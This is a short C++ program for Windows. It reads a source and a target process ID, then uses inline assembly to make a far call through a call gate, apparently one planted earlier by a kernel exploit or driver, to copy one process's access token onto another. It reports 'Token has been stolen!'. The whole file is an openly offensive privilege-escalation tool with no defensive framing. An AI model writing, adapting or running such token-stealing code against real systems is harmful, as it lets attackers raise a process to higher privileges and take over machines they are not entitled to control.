#include <iostream>
#include <Windows.h>

int main()
{
	WORD farcall[] = { 0, 0, 0xab };
	BYTE result = 0;

	DWORD TARGET_PID, SOURCE_PID;

	std::cout << "SOURCE_PID (dec): ";
	scanf_s("%d", &SOURCE_PID);
	std::cout << std::endl << "TARGET_PID (dec): ";
	scanf_s("%d", &TARGET_PID);
	std::cout << std::endl;

	__asm
	{
		push[SOURCE_PID]
		push[TARGET_PID]
		call fword ptr[farcall]
		mov[result], al
	}

	if (result) std::cout << "Token has been stolen!" << std::endl;
	else std::cout << "Error!" << std::endl;
}